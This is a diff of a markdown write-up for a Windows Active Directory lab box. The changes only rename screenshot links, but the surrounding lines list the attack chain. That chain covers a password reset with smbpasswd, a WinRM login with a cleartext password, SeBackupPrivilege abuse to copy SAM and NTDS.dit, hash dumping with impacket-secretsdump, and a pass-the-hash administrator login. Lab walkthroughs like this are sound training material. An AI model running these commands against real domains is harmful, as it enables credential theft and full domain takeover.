@@ -12,12 +12,12 @@
 		* `smbpasswd -r IP -U USER`
 * used winrm to connect as user `evil-winrm -i IP -u Caroline.Robinson -p BallsInYourFace69!`
 	* flag was on desktop user.txt
-![[Pasted image 20231116152304.png]]
-![[Pasted image 20231114210408.png]]
+![[user-flag.png]]
+![[cme-smb-passwd-spray.png]]
 
 ## Root
 * hint says to look at user permissions `whoami /priv`
-![[Pasted image 20231116153206.png]]
+![[initial-privs.png]]
 * SeBackupPrivilege
 	* allows users to read all files on a system
 	* https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
@@ -27,11 +27,11 @@
 * Used mimikatz to dump hashes from the sam hive
 	* `pypykatz registry --sam sam system`
 	* this is only local creds; useless
-![[Pasted image 20231116160754.png]]
+![[local-creds.png]]
 ### Exploiting SeBackup/SeRestore
 * use diskshadow and robocopy to dump ntds.dit
 * exfiltrate to host
 * `impacket-secretsdump -ntds ntds.dit -system system.hive local`
 * pass the hash via evil-winrm
 	* `evil-winrm -i IP -u 'administrator' -H '<REDACTED>'`
-![[Pasted image 20231122184832.png]]
+![[vulnlab/baby/root-flag.png]]
